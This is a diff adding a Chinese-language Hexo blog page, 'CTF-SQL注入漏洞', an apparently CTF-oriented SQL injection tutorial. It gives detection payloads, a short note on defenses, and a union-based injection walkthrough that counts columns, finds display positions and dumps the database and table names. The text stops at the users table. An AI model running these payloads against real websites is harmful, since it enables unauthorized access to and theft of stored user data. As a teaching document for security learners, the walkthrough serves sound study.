@@ -1,0 +1,1105 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="David Penn">
+  <meta name="keywords" content="Blog">
+  
+    <meta name="description" content="SQL注入漏洞一、SQL注入简介1、SQL结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言） 2、SQL注入SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-SQL注入漏洞">
+<meta property="og:url" content="https://davidpenn888.github.io/2023/08/20/CTF-Show-1/index.html">
+<meta property="og:site_name" content="DavidPenn 的博客">
+<meta property="og:description" content="SQL注入漏洞一、SQL注入简介1、SQL结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言） 2、SQL注入SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210612195905209.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210612200112789.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210612200244975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5765e07f95e7c1366287a872ffccddf6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/adec07611bdcddfbc5c106c8ea2c304d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/be9fdc34bfe04bccc5c95b689c411cd1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/801909c73d735099f696d1412b874db7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/b5a63fc27c7581f722c970bb218f7edb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/352708c1ecc12633b9b911719ba5497a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/f962f6f2985878f6614126a7bbca294e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/dcd326b0b7cb326625241ac599324a96.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/61e67d00f7c5bf7b7f22c4a5b76c6bd3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5591e604770150f33f8b840c14e1c29c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/eedfcbea64b0073edf1c4f9296a5d34b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316093930798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316094306845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021031609453822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316094730140.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316095213384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316095511672.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316095719686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021031617333684.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316173450459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316182126690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316174105779.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316174130279.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210323100756615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210323101045836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210323101137486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210323101350105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210323101417342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210323101809562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210325120628613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210325120909611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210325171938838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021032517204294.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210325172142765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210325172253439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210325172320556.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210325172540390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210324174905605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210820152802384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821102033527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821100701673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821100948766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210324175615607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821231155171.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821232112841.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821231155171.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821232504840.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821233043656.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821233922778.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821233900317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821234529785.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210821234552955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2023-08-20T09:15:10.000Z">
+<meta property="article:modified_time" content="2023-08-20T15:49:59.988Z">
+<meta property="article:author" content="David Penn">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210612195905209.png">
+  
+  
+  
+  <title>CTF-SQL注入漏洞 - DavidPenn 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"davidpenn888.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>DavidPenn Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF-SQL注入漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-20 17:15" pubdate>
+          2023年8月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          117 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CTF-SQL注入漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="一、SQL注入简介"><a href="#一、SQL注入简介" class="headerlink" title="一、SQL注入简介"></a>一、SQL注入简介</h2><h3 id="1、SQL"><a href="#1、SQL" class="headerlink" title="1、SQL"></a>1、SQL</h3><p>结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）</p>
+<h3 id="2、SQL注入"><a href="#2、SQL注入" class="headerlink" title="2、SQL注入"></a>2、SQL注入</h3><p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</p>
+<h3 id="3、SQL注入漏洞原因分析"><a href="#3、SQL注入漏洞原因分析" class="headerlink" title="3、SQL注入漏洞原因分析"></a>3、SQL注入漏洞原因分析</h3><p>我们都知道web分为前端和后端，前端负责数据显示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如MySQL数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询。</p>
+<h3 id="4、SQL注入漏洞对于数据安全的影响"><a href="#4、SQL注入漏洞对于数据安全的影响" class="headerlink" title="4、SQL注入漏洞对于数据安全的影响"></a>4、SQL注入漏洞对于数据安全的影响</h3><ul>
+<li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li>
+<li>网页篡改：通过操作数据库对特定网页进行篡改。</li>
+<li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
+<li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li>
+<li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
+<li>破坏硬盘数据，瘫痪全系统。</li>
+</ul>
+<h2 id="二、发现SQL注入漏洞"><a href="#二、发现SQL注入漏洞" class="headerlink" title="二、发现SQL注入漏洞"></a>二、发现SQL注入漏洞</h2><h3 id="1、漏洞探测"><a href="#1、漏洞探测" class="headerlink" title="1、漏洞探测"></a>1、漏洞探测</h3><p>1.注入可能存在的地方</p>
+<p>sql注入，那么这个地方肯定是与数据库有数据交互的，所以我们可以优先观察那种页面存在传值或者查询的地方。比如url中的GET型传参，如?id=1</p>
+<p>如我们看见这种就可以考虑</p>
+<p><img src="https://img-blog.csdnimg.cn/20210612195905209.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>或者是搜索框，前端将用户输入的数据代入到数据库中进行查询，这种以POST方法进行发送数据。如下这种地方</p>
+<p><img src="https://img-blog.csdnimg.cn/20210612200112789.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>或者是HTTP请求头部字段如Cookie值，下面会讲到。</p>
+<p>2.漏洞探测</p>
+<p>此时需要我们用burp截取查询的数据包，找到传参的变量然后在其后面加上单引号、双引号等如下payload进行测试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">#判断如下闭合方式是否会报错，会报错则肯定存在注入<br><span class="hljs-operator">=</span>test<span class="hljs-string">&#x27;                         </span><br><span class="hljs-string">=test&quot;                         </span><br><span class="hljs-string"></span><br><span class="hljs-string">#若不报错则判断是否存在布尔盲注，如果页面会有不同的显示在可能存在漏洞</span><br><span class="hljs-string">=test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">-1</span><span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">=test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">-1</span><span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;  </span><br><span class="hljs-string">=test&quot; and -1=-1 or &quot;</span><br><span class="hljs-string">=test&quot; and -1=-2 or &quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210612200244975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="2、SQL注入防范"><a href="#2、SQL注入防范" class="headerlink" title="2、SQL注入防范"></a>2、SQL注入防范</h3><p>常遇到的一些防范方式：</p>
+<p>1.对输入进行严格的转义和过滤</p>
+<p>2.通过WAF启用防SQL Inject注入策略（或类似防护系统）</p>
+<h2 id="三、SQL常见的注入手法"><a href="#三、SQL常见的注入手法" class="headerlink" title="三、SQL常见的注入手法"></a>三、SQL常见的注入手法</h2><h3 id="1、联合查询-union注入"><a href="#1、联合查询-union注入" class="headerlink" title="1、联合查询(union注入)"></a>1、联合查询(union注入)</h3><p>如下，要求我们传入一个id值过去。传参?id=1，当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5765e07f95e7c1366287a872ffccddf6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><em>1. 注入点判断</em></p>
+<p>开始判断是否存在注入，输入?id=1’，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/adec07611bdcddfbc5c106c8ea2c304d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>继续判断，输入 ?id=1’ and 1=1 –+ 页面正常显示传送门：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114808681">关于sql注入中的 –+</a></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/be9fdc34bfe04bccc5c95b689c411cd1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>?id=1’ and 1=2 –+ 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/801909c73d735099f696d1412b874db7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>页面会根据输入的数据变化而变化，当存在注入点时，优先考虑使用联合注入手法。</p>
+<p><em>2. 判断当前表的字段个数</em></p>
+<p>传送门：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114809458">关于order by</a></p>
+<p>输入order by 3，页面无异常反应</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b5a63fc27c7581f722c970bb218f7edb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>将3修改为4，此时显示未知的列，说明此时当前表中只有3列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4 --+ </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/352708c1ecc12633b9b911719ba5497a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><em>3. 判断显示位</em></p>
+<p>以下为union注入中较为常用的一些函数和环境变量</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>MySQL 版本</td>
+</tr>
+<tr>
+<td>user()</td>
+<td>当前数据库用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>当前数据库名</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库路径</td>
+</tr>
+</tbody></table>
+<p>接下来测试我们的输入会在屏幕哪个地方进行回显。上面我们判断出来了表中有3列，所以union select的时候就写xx,xx,xx三个数据</p>
+<p>需让union select前面的参数查不出来而回显后面的语句，所以id=-1’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+ </span><br></code></pre></td></tr></table></figure>
+
+<p>如下，在name和password值中回显了我们的输入，这时我们就可以在回显2或3的放置放入测试语句。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f962f6f2985878f6614126a7bbca294e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><em>4. 爆当前数据库名字</em></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br></code></pre></td></tr></table></figure>
+
+<p>获取当前数据库名为“security”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/dcd326b0b7cb326625241ac599324a96.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><em>5. 爆当前数据库中的表</em></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#直接套用语句<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></code></pre></td></tr></table></figure>
+
+<p>显示当前数据库中存在4个表“emails,referers,uagents,users”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/61e67d00f7c5bf7b7f22c4a5b76c6bd3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><em>6. 爆表中的字段</em></p>
+<p>我们这里选择users表进行进一步的获取表中的字段信息</p>
